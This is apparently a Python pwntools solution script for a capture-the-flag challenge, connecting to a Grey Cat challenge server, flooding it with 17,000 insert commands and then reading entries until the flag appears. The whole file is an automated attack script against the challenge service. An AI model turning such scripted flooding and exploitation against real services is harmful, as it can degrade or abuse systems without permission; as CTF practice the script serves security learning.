from pwn import *
from random import randint
from Crypto.Util.number import long_to_bytes

max = 0

p = remote('challs.nusgreyhats.org', 10527)
p.recvuntil(b'slow\n')

for i in range(17000):
    
    p.sendline(b'0')
    p.sendline(str(max).encode('utf-8') + b' ' + str(i).encode('utf-8'))
    max = max + randint(0, 5000)

print("Completed Part 1: Insertion")
print("Proceeding to Part 2: Reading of data...")

for i in range(7998):

    p.sendline(b'1')
    msg = p.recvline()
    if "grey" in msg.decode('utf-8'):
        print(msg.decode('utf-8'))
        p.close()
        break
    
    if i % 1000 == 0:
        print("Reading Data #" + str(i))
